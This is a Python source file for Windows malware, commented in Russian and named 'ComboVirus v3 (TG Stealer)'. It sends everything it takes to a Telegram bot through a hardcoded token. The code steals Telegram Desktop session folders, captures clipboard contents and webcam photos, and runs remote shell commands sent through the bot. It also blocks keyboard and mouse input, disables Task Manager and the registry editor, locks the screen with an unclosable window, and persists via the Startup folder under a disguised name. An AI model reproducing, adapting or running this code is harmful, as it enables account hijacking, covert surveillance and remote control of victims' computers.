import os, sys, time, shutil, requests, tkinter as tk, psutil, winreg, threading, random, string, socket
import cv2, sqlite3, subprocess, tempfile
import pyperclip
import ctypes

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9235115664:AAEnXrZR-m3UtZ4uBaBqPOwJnng2M__xsBc"
CHAT_ID = "8573437923"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PASSWORD = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def send_msg(text):
    try: requests.post(f"{API}/sendMessage", json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
    except: pass

def send_file(filepath, caption):
    try:
        with open(filepath, "rb") as f:
            requests.post(f"{API}/sendDocument", data={"chat_id": CHAT_ID, "caption": caption}, files={"document": f})
    except: pass

# --- КРАЖА СЕССИЙ TELEGRAM ---
def steal_telegram():
    appdata = os.getenv("APPDATA")
    # Ищем папку tdata (Telegram Desktop)
    tg_paths = [
        os.path.join(appdata, "Telegram Desktop", "tdata"),
        os.path.join(appdata, "Telegram", "tdata")
    ]
    for path in tg_paths:
        if os.path.exists(path):
            temp_dir = tempfile.gettempdir()
            archive_path = os.path.join(temp_dir, "tg_session")
            try:
                shutil.make_archive(archive_path, 'zip', path)
                send_file(archive_path + ".zip", "✈️ **Сессия Telegram Desktop (tdata)**\nЗакинь в папку tdata на своем ПК, чтобы зайти в аккаунт.")
                os.remove(archive_path + ".zip")
            except Exception as e:
                send_msg(f"Ошибка кражи ТГ: {e}")

# --- ПЕРЕХВАТ БУФЕРА (если код скопируют) ---
def spy_clipboard():
    last_text = ""
    while True:
        try:
            text = pyperclip.paste()
            # Если текст изменился и в нем есть цифры (похоже на код)
            if text != last_text and text.strip() != "":
                last_text = text
                if len(text) < 20: # Коды обычно короткие
                    send_msg(f"📋 **Перехвачен буфер обмена (возможно код):**\n`{text}`")
        except: pass
        time.sleep(2)

# --- ОСТАЛЬНОЕ (Мышь, Вебка, Локер) ---
def block_input():
    ctypes.windll.user32.BlockInput(True)

def spy_webcam():
    while True:
        try:
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    p = os.path.join(tempfile.gettempdir(), "cam.jpg")
                    cv2.imwrite(p, frame)
                    cap.release()
                    requests.post(f"{API}/sendPhoto", data={"chat_id": CHAT_ID, "caption": "📸 Вебка"}, files={"photo": open(p, "rb")})
                    os.remove(p)
            time.sleep(20)
        except: pass

def check_commands():
    last_id = 0
    while True:
        try:
            res = requests.get(f"{API}/getUpdates?offset={last_id + 1}&timeout=10").json()
            if res.get("result"):
                for update in res["result"]:
                    last_id = update["update_id"]
                    if "message" in update and "text" in update["message"]:
                        cmd = update["message"]["text"]
                        if cmd.startswith("/cmd "):
                            out = subprocess.check_output(cmd[5:], shell=True, stderr=subprocess.STDOUT, timeout=10).decode('cp866', errors='ignore')
                            send_msg(f"🖥 `{cmd[5:]}`\n```\n{out[:3000]}\n```")
                        elif cmd == "/block":
                            block_input()
                            send_msg("🖱 Ввод заблокирован!")
        except: pass
        time.sleep(3)

def disable_tools():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except: pass

def show_window():
    root = tk.Tk()
    root.configure(bg="black")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind("<Alt-F4>", lambda e: "break")
    tk.Label(root, text="🚨 СИСТЕМА ЗАБЛОКИРОВАНА 🚨\n\nВвод отключен. Смотри в камеру.", fg="red", bg="black", font=("Arial", 20)).pack(expand=True)
    root.mainloop()

if __name__ == "__main__":
    try: shutil.copy(sys.executable, os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\sys_update.exe'))
    except: pass
    
    send_msg(f"🚨 **ComboVirus v3 (TG Stealer)**\n💻 ПК: `{socket.gethostname()}`\n🔑 Пароль: `{PASSWORD}`")
    
    threading.Thread(target=steal_telegram, daemon=True).start()
    threading.Thread(target=spy_clipboard, daemon=True).start()
    threading.Thread(target=spy_webcam, daemon=True).start()
    threading.Thread(target=check_commands, daemon=True).start()
    
    disable_tools()
    show_window()
